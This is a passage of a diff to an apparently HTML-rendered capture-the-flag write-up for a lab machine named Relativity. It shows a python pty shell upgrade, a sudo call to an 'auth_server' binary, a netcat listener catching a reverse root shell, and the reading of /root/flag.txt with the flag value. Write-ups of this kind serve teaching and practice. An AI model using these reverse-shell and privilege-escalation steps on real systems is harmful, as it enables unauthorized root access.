 
-```@Relativity ~]$ python -c &quot;import pty;pty.spawn('/bin/sh');&quot;
+<pre><code class="language-bash">$ python -c &quot;import pty;pty.spawn('/bin/sh');&quot;
 sh-4.2$ export PATH=/home/jetta/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin
 &lt;etta/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin
-sh-4.2$ hash -r
 sh-4.2$ sudo auth_server/auth_server
 sudo auth_server/auth_server
 [+] Checking Certificates...done
@@ -529,13 +507,10 @@ error: (12)
 
 <p><code>auth_server</code> did its usual trick with error(12), however, my netcat listener now had a root prompt \o/</p>
 
-<p>```bash root shell and flag.txt</p>
-
-<h1 id="nc-lvp-6677:148726962b60da82f616754f53c617fb">nc -lvp 6677</h1>
-
-<p>listening on [any] 6677 &hellip;
+<pre><code class="language-bash"># nc -lvp 6677
+listening on [any] 6677 ...
 192.168.56.21: inverse host lookup failed: Unknown server error : Connection timed out
-connect to [<snip>] from (UNKNOWN) [192.168.56.21] 38267
+connect to [&lt;snip&gt;] from (UNKNOWN) [192.168.56.21] 38267
 [root@Relativity jetta]# id
 id
 uid=0(root) gid=0(root) groups=0(root)
@@ -546,7 +521,7 @@ locate flag.txt
 cat /root/flag.txt
 65afa0e5928b98f7ae283e16df2d43bf
 [root@Relativity jetta]#
-```</p>
+</code></pre>
 
 <p>As you can see, flag.txt was found by simply using the locate command for the file. Because I am now root, I have no troubles reading it, and as such, the challenge was considered completed!</p>
 
